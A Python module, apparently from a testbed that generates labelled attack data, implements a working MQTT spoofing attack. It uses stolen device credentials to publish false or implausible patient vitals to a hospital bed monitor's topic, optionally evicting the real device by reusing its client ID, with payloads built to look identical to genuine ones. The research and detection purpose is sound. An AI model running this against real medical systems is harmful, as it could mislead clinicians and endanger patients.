"""spoof_vitals: connect with stolen device credentials and publish wrong vitals to that
device's own topic, some with implausible jumps. Two sub-modes, logged: a second client ID, or
reusing the real device's client ID (which evicts it — validated by the Task-2 spike). Payloads
mimic the real schema; the label comes from source + time, never a payload flag."""
import json
import time

import paho.mqtt.client as mqtt
from payloads import monitor_vitals

from .creds import pick_creds
from .. import timing, util


def _payload(ctx, bed, implausible):
    hr = ctx.rng.choice([220, 20, 0]) if implausible else ctx.rng.randint(60, 100)
    spo2 = ctx.rng.choice([60, 40]) if implausible else ctx.rng.randint(94, 100)
    # Same builder as the real monitor (services/shared/payloads.py): identical field order and
    # value representation (hr/spo2 coerced to 1-dp floats, device ts format), so spoofed vitals
    # are not separable from benign by payload size or a per-field token (review B2).
    return monitor_vitals(bed, hr, spo2,
                          ctx.rng.randint(90, 140), ctx.rng.randint(60, 90),
                          vitals_source="bidmc")


def spoof_vitals(ctx, params):
    duration = int(params.get("duration", 60))
    # Deterministic per-session mode alternating by session index (M6 + N1) unless the schedule
    # pins it via client_id_reuse (the second_client_id override + smoke/tests use that).
    reuse = bool(params["client_id_reuse"]) if "client_id_reuse" in params \
        else timing.choose_spoof_mode(ctx.session_id)
    user, pw, src = pick_creds(ctx, "device")
    if not user:
        return {"outcome": "fail", "notes": "no device credentials available"}
    bed = int(user.split("-")[0][3:])          # "bed3-monitor" -> 3
    client_id = user if reuse else f"{user}-x"
    topic = f"ward1/bed{bed}/monitor/vitals"
    c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=client_id)
    c.username_pw_set(user, pw)
    sent = 0
    try:
        c.connect(ctx.broker_ip, 1883)
        c.loop_start()
        deadline = util.monotonic() + duration
        while util.monotonic() < deadline:
            c.publish(topic, json.dumps(_payload(ctx, bed, ctx.rng.random() < 0.3)), qos=0)
            sent += 1
            time.sleep(1.0)
        c.loop_stop()
        c.disconnect()
    except Exception as exc:
        return {"outcome": "fail", "notes": str(exc), "creds_source": src}
    # Structured victim (review N2): the impersonated monitor. Same in both spoof modes. MAC is not
    # known to the attacker in-band (recorded null); labelling keys on the IP, and the device's MAC
    # is recoverable from its own traffic at extraction time.
    victims = [{"ip": ctx.user_ip.get(user), "mac": None, "role": "monitor", "bed": bed}]
    return {"targets": [ctx.broker_ip], "creds_source": src,
            "victims": victims,
            "params_out": {"client_id_reuse": reuse,
                           "spoof_mode": "reuse" if reuse else "second_client_id"},
            "notes": f"published {sent} spoofed vitals to bed{bed} as {user} ({src}), "
                     f"client_id_reuse={reuse}"}


spoof_vitals.STAGE = "abuse-stolen-creds"
